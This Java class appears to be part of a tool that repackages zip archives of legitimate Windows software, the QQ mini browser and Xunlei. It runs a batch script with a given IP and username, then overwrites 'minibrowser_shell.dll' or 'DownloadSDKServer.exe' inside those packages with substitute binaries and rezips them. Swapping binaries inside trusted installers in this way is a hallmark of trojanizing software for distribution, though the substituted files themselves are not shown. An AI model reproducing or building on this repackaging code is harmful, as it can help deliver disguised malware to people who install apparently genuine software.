package com.parcel;

import java.io.File;

public class WindowsParcel {

	private static String WINDOWS_PARCELS[] = {
		"qqminibrowser.zip",
		"qqminibrowser_small.zip",
		"xunlei1.zip"
	};
	
	
	private String mIP;
	private String mUserName;
	
	public WindowsParcel(String ip,String username){
		mUserName = username;
		mIP = ip;
		
		doWork();
	}
	
	
	public void doWork(){
		String curdir = System.getProperty("user.dir")+"/";
		
		String tmppath = curdir + Parcel.TEMP_PATH;
		String outpath = curdir + Parcel.OUT_PATH;
		
		String workpath = curdir + Parcel.WORK_PATH;
		
		String windowspath = curdir + "windows/";
		
		String cmd = "pcmake.bat " + mIP + " " + mUserName + " " + windowspath;
		Cmd.cmd(cmd);
		try {
			Thread.sleep(1000);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		File files[] = new File(workpath).listFiles();
		for (int i = 0; i < files.length; i++) {
			
			for (int j = 0; j < WINDOWS_PARCELS.length; j++) {
				
				if (files[i].getName().equals(WINDOWS_PARCELS[j]) == true) {
					String zipfn = files[i].getName();
					String mainzipfn = FileUtils.getMainName(zipfn);
					Zip.unZip(files[i].getAbsolutePath(), tmppath + mainzipfn);
					
					if (zipfn.toLowerCase().contains("qqminibrowser")) {
						FileUtils.copyToPath(outpath + "minibrowser_shell.dll", tmppath + mainzipfn + "/");
					}else if (zipfn.toLowerCase().equals("xunlei1.zip")) {
						FileUtils.copyToPath(outpath + "DownloadSDKServer.exe", tmppath + mainzipfn+ "/SDK/");
					}

					Zip zip = new Zip(outpath + zipfn, tmppath + mainzipfn, "", "", "");
					zip.zip();
				}
			}
		}
	}
}
